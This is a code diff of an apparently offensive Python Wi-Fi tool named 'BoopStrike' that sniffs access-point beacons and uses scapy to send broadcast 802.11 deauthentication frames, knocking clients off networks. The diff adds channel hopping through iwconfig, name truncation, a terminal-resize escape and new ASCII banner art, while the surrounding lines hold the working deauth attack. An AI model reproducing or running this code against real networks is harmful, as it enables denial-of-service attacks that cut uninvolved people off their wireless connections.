@@ -209,7 +209,7 @@ def handler_beacon(packet):
 
     if mac not in Access_Points and mac != configuration.skip:
         Access_Points.append(mac)
-        Deauth_Dict["APS"].append( [mac, configuration.channel, name] )
+        Deauth_Dict["APS"].append( [mac, configuration.channel, name[:15]] )
 
     if mac != configuration.skip:
         send(Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)/Dot11Deauth(), inter=(0.05), count=(1))
@@ -257,6 +257,11 @@ def channel_hopper(configuration):
             "2.442": 7, "2.447": 8, "2.452": 9,
             "2.457": 10, "2.462": 11
             }
+
+        for channel in ["2.412", "2.437", "2.462"]:
+            system("sudo iwconfig "+interface+" freq "+channel+"G")
+            configuration.channel = __FREQS__[channel]
+            sleep(3)
 
     elif frequency == "5":
         __FREQS__ = {
@@ -322,6 +327,8 @@ def start_sniffer(configuration):
 def printer(configuration):
     global Deauth_Dict
     global Start_Time
+    global Access_Points
+    global Clients
 
     typetable = "simple"
     timeout = 1.5
@@ -331,9 +338,17 @@ def printer(configuration):
         for item in Deauth_Dict["APS"]:
             wifis.append(item)
 
+        # if len(wifis) > 20:
+        #     Deauth_Dict["APS"] = []
+        #     Access_Points = []
+
         clients = []
         for item in Deauth_Dict["Client"]:
             clients.append(item)
+
+        # if len(clients) > 12:
+        #     Deauth_Dict["Client"] = []
+        #     Clients = []
 
         wifis.sort(key=lambda x: (x[1], x[2]))
         clients.sort(key=lambda x: (x[2]))
@@ -357,6 +372,10 @@ def printer(configuration):
             timeout += .05
 
         sleep(timeout)
+    return
+
+def set_size(height, width):
+    stdout.write("\x1b[8;{rows};{cols}t".format(rows=height, cols=width))
     return
 
 def int_main(configuration):
@@ -399,18 +418,21 @@ def int_main(configuration):
 
 def display_art():
     print(bcolors.OKBLUE+"""
-__________                      _________ __         .__ __
-\______   \ ____   ____ ______ /   _____//  |________|__|  | __ ____
- |    |  _//  _ \ /  _ \\\____ \\\_____  \\\   __\_  __ \  |  |/ // __ \\
- |    |   (  <_> |  <_> )  |_> >        \|  |  |  | \/  |    <\  ___/
- |______  /\____/ \____/|   __/_______  /|__|  |__|  |__|__|_ \\\___  >
-        \/              |__|          \/                     \/    \/
+  ____                    _____ _        _ _
+ |  _ \                  / ____| |      (_) |
+ | |_) | ___   ___  _ __| (___ | |_ _ __ _| | _____
+ |  _ < / _ \ / _ \| '_ \\\___ \| __| '__| | |/ / _ \\
+ | |_) | (_) | (_) | |_) |___) | |_| |  | |   <  __/
+ |____/ \___/ \___/| .__/_____/ \__|_|  |_|_|\_\___|
+                   | |
+                   |_|
     """)
     print(bcolors.HEADER+"     Codename: Inland Taipan\r\n"+bcolors.BOLD)
     return
 
 
 if __name__ == "__main__":
+    set_size(35, 55)
     display_art()
 
     configuration = Configuration()
